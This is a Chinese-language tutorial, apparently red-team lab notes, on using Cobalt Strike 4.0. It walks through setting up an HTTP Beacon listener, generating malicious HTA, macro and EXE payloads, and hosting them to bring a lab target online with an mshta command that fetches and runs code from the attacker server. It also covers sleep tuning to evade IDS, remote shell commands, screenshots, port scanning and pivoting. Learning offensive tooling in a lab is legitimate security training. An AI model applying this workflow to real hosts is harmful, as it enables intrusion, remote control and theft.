## 核心操作：创建监听器

在CS中进行任何操作，首先都需要创建监听器（Listener）。没有监听器，后续攻击无法进行。

![](img/889945f80794948668b043f45852a6c6_8.png)

以下是创建监听器的步骤：

1.  点击 **Cobalt Strike** -> **Listeners** 打开监听器管理窗口。
2.  点击 **Add** 按钮创建新的监听器。
3.  输入监听器名称，例如 `demo`。
4.  选择Payload（载荷类型）。CS 4.0中常见的选项有：
    *   `Beacon`：CS自带的Payload。
    *   `Beacon DNS`：通过DNS协议通信。
    *   `Beacon HTTP` / `Beacon HTTPS`：通过HTTP/HTTPS协议通信。
    *   `Beacon SMB`：通过SMB协议通信（常用于内网横向移动）。
    *   `Beacon TCP`。
    本教程以 `Beacon HTTP` 为例。
5.  配置Payload参数：
    *   **HTTP Hosts**：设置为团队服务器的公网IP地址（例如 `10.10.100.128`）。这是Beacon回连的地址。
    *   **HTTP Host (Stager)**：同样设置为服务器IP。Stager用于传输初始的引导代码。
    *   **HTTP Port**：设置监听的端口，例如 `8080`。不建议使用80端口，容易与服务器上其他服务冲突。
6.  点击 **Save** 保存，然后点击 **Start` 启动监听器。

![](img/889945f80794948668b043f45852a6c6_18.png)

监听器启动后，可以在服务器上使用命令 `netstat -antulp | grep 8080` 验证端口是否在监听状态。

## 生成攻击载荷与上线靶机

创建好监听器后，下一步就是生成攻击载荷并诱使靶机执行，从而使其上线。

![](img/889945f80794948668b043f45852a6c6_28.png)

![](img/889945f80794948668b043f45852a6c6_16.png)

![](img/889945f80794948668b043f45852a6c6_30.png)

攻击载荷生成位于 **Attacks** 菜单下。以下是主要选项：

![](img/889945f80794948668b043f45852a6c6_32.png)

*   **Packages**：生成各种格式的载荷。
    *   `HTML Application`：生成恶意的HTA文件。
    *   `MS Office Macro`：生成恶意的Office宏文档。
    *   `Payload Generator`：生成多种语言版本的Payload。
    *   `Windows Executable`：生成可执行的EXE文件（默认32位，可勾选64位）。
    *   `Windows Executable (S)`：生成Stageless的EXE文件（全功能木马，体积大）。
*   **Web Drive-by**：基于Web的攻击向量。
    *   `Manage`：管理当前开启的Web服务。
    *   `Clone Site`：克隆钓鱼网站。
    *   `Host File`：在服务器端口提供文件下载。
    *   `Scripted Web Delivery`：为Payload提供Web下载服务（类似MSF的`exploit/multi/script/web_delivery`）。

![](img/889945f80794948668b043f45852a6c6_34.png)

![](img/889945f80794948668b043f45852a6c6_35.png)

![](img/889945f80794948668b043f45852a6c6_37.png)

**让靶机上线的示例（使用HTML Application）：**

1.  在 **Attacks** -> **Packages** -> **HTML Application** 中，选择之前创建的监听器（如`demo (HTTP)`）。
2.  选择执行方法，例如 `PowerShell`。
3.  保存生成的HTA文件到本地（如桌面）。
4.  需要让靶机能访问到这个文件。使用 **Attacks** -> **Web Drive-by** -> **Host File**。
    *   选择刚才保存的HTA文件。
    *   设置托管端口，例如 `9090`（避免使用80）。
    *   点击 **Launch**，会生成一个类似 `http://10.10.100.128:9090/xxx.hta` 的URL。
5.  在靶机（例如IP为 `192.168.123.131` 的Win7系统）上，通过命令行或其他方式访问此URL。例如，使用命令：`mshta http://10.10.100.128:9090/xxx.hta`。
6.  执行后，稍等片刻，在CS的会话（Sessions）视图中就能看到靶机上线。

## 与上线靶机进行交互

![](img/889945f80794948668b043f45852a6c6_43.png)

靶机上线后，我们可以对其进行一系列操作。

![](img/889945f80794948668b043f45852a6c6_44.png)

![](img/889945f80794948668b043f45852a6c6_46.png)

![](img/889945f80794948668b043f45852a6c6_28.png)

**基本交互流程：**

1.  在会话列表中，右键点击上线的靶机，选择 **Interact**，打开交互式命令行界面。
2.  首先，通常需要修改心跳间隔（sleep时间），以避免流量特征过于明显。默认可能是60秒。
    *   命令：`sleep 2` （设置为2秒）。**注意**：在真实环境中，过短的sleep时间容易被IDS检测。
3.  使用 `shell` 命令执行系统命令。格式：`shell [cmd命令]`。
    *   例如：`shell whoami` 查看当前权限。
    *   例如：`shell ipconfig` 查看网络配置。
4.  输入 `help` 可以查看所有可用的Beacon命令。

**其他常用功能（在靶机右键菜单中）：**

![](img/889945f80794948668b043f45852a6c6_48.png)

*   **Access**：提权相关模块。
*   **Explore**：
    *   `Browser Pivot`：浏览器代理。
    *   `File Browser`：文件浏览器。
    *   `Process List`：进程列表。
    *   `Screenshot`：屏幕截图（截图后可在 **View** -> **Screenshots** 中查看）。
    *   `Port Scan`：端口扫描（可扫描靶机所在内网网段）。
*   **Pivoting**：代理转发，用于内网横向移动。

![](img/889945f80794948668b043f45852a6c6_50.png)

例如，进行端口扫描后，可以在 **View** 菜单切换到 **Targets** 视图，查看发现的存活主机和开放服务，为后续内网渗透做准备。

## 脚本管理与总结

CS支持通过加载第三方 `.cna` 脚本进行功能扩展。

1.  点击 **Cobalt Strike** -> **Script Manager**。
2.  点击 **Load**，选择你的 `.cna` 脚本文件。
3.  加载成功后，脚本功能会集成到CS的菜单或命令中。

![](img/889945f80794948668b043f45852a6c6_59.png)
